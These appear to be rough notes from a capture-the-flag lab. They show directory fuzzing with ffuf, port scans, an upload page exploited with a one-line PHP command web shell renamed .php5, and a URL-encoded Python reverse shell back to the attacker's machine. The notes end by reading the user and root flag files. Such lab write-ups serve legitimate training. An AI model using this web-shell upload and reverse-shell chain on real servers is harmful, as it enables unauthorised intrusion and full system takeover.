
FUFF

js                      [Status: 301, Size: 309, Words: 20, Lines: 10]
uploads                 [Status: 301, Size: 314, Words: 20, Lines: 10]
css                     [Status: 301, Size: 310, Words: 20, Lines: 10]
panel                   [Status: 301, Size: 312, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]


RUSTSCAN

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

FFUF

root@ip-10-10-174-245:~# ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt -u  http://10.10.137.93/panel/FUZZ 


index.php               [Status: 200, Size: 732, Words: 175, Lines: 23]

/panel/ == upload page
root@ip-10-10-174-245:~# cp /usr/share/webshells/php/php-reverse-shell.php .
root@ip-10-10-174-245:~# chmod +x php-reverse-shell.php 
root@ip-10-10-174-245:~# subl php-reverse-shell.php 


NAMP 


PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
MAC Address: 02:EE:F2:A3:72:A5 (Unknown)

UPLOAD

<?php
    echo system($_GET["cmd"]);
?>


http://10.10.137.93/uploads/sss.php5?cmd=ls

USER flag

view-source:http://10.10.137.93/uploads/sss.php5?cmd=cat%20/var/www/user.txt


/usr/bin/python

SHELL
view-source:http://10.10.137.93/uploads/sss.php5?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.174.245%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)%27



READ ROOT FLAG

```
python -c 'print(open("/root/root.txt").read())'
```
